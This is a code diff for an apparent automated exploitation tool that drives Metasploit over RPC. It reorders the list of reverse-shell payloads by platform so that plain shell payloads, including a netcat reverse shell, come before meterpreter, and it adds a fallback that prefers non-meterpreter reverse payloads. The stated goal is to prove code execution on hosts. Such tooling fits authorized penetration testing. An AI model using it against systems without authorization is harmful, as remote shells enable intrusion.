@@ -880,38 +880,36 @@ def _is_x64(host):
 
 
 def _payload_prefs(platform, x64):
+    """Preferred reverse payloads for a platform, shell payloads first. The goal is
+    to prove code execution (a shell calling back is proof the host is compromised),
+    not to maintain rich post-exploitation access, so command and native shell
+    payloads are preferred. They also avoid a meterpreter option-serialization issue
+    that some msfrpcd builds reject (AutoLoadExtensions must be a scalar), which
+    blocks meterpreter payloads outright. Meterpreter stays as a last-resort fallback
+    for modules that only offer it."""
     prefs = []
     if platform == "windows":
         if x64:
             prefs += [
-                "windows/x64/meterpreter/reverse_tcp",
-                "windows/x64/meterpreter_reverse_tcp",
                 "windows/x64/shell/reverse_tcp",
                 "windows/x64/shell_reverse_tcp",
             ]
         prefs += [
-            "windows/meterpreter/reverse_tcp",
-            "windows/meterpreter_reverse_tcp",
             "windows/shell/reverse_tcp",
             "windows/shell_reverse_tcp",
         ]
     elif platform == "linux":
         if x64:
             prefs += [
-                "linux/x64/meterpreter/reverse_tcp",
-                "linux/x64/meterpreter_reverse_tcp",
                 "linux/x64/shell/reverse_tcp",
                 "linux/x64/shell_reverse_tcp",
             ]
         prefs += [
-            "linux/x86/meterpreter/reverse_tcp",
-            "linux/x86/meterpreter_reverse_tcp",
             "linux/x86/shell/reverse_tcp",
             "linux/x86/shell_reverse_tcp",
         ]
     elif platform == "osx":
         prefs += [
-            "osx/x64/meterpreter/reverse_tcp",
             "osx/x64/shell_reverse_tcp",
         ]
     elif platform == "unix":
@@ -923,13 +921,31 @@ def _payload_prefs(platform, x64):
             "cmd/unix/reverse_perl",
         ]
     elif platform == "java":
-        prefs += ["java/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp"]
+        prefs += ["java/jsp_shell_reverse_tcp"]
     elif platform == "php":
-        prefs += ["php/meterpreter/reverse_tcp", "php/reverse_php"]
+        prefs += ["php/reverse_php"]
     elif platform == "python":
-        prefs += ["python/meterpreter/reverse_tcp", "python/shell_reverse_tcp"]
-    # generic reverse fallbacks, always last
-    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_bash", "cmd/unix/reverse"]
+        prefs += ["python/shell_reverse_tcp"]
+    # generic shell fallbacks come before any platform meterpreter below, so a
+    # module offering only meterpreter plus a generic shell still proves execution
+    # with the shell. Meterpreter platform payloads are appended last as the true
+    # last resort for modules that offer nothing else.
+    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_bash",
+              "cmd/unix/reverse", "cmd/unix/reverse_netcat"]
+    if platform == "windows":
+        if x64:
+            prefs += ["windows/x64/meterpreter/reverse_tcp",
+                      "windows/x64/meterpreter_reverse_tcp"]
+        prefs += ["windows/meterpreter/reverse_tcp",
+                  "windows/meterpreter_reverse_tcp"]
+    elif platform == "linux":
+        if x64:
+            prefs += ["linux/x64/meterpreter/reverse_tcp",
+                      "linux/x64/meterpreter_reverse_tcp"]
+        prefs += ["linux/x86/meterpreter/reverse_tcp",
+                  "linux/x86/meterpreter_reverse_tcp"]
+    elif platform in ("java", "php", "python", "osx"):
+        prefs += [f"{platform}/meterpreter/reverse_tcp"]
     return prefs
 
 
@@ -949,6 +965,12 @@ def _select_payload(exploit, full_module, host):
     for p in _payload_prefs(platform, x64):
         if p in compat:
             return p
+    # prefs did not match; prefer a shell reverse payload over meterpreter, then
+    # any reverse payload, so proving execution still takes precedence.
+    shells = sorted(p for p in compat
+                    if "reverse" in p and "bind" not in p and "meterpreter" not in p)
+    if shells:
+        return shells[0]
     for p in sorted(compat):
         if "reverse" in p and "bind" not in p:
             return p
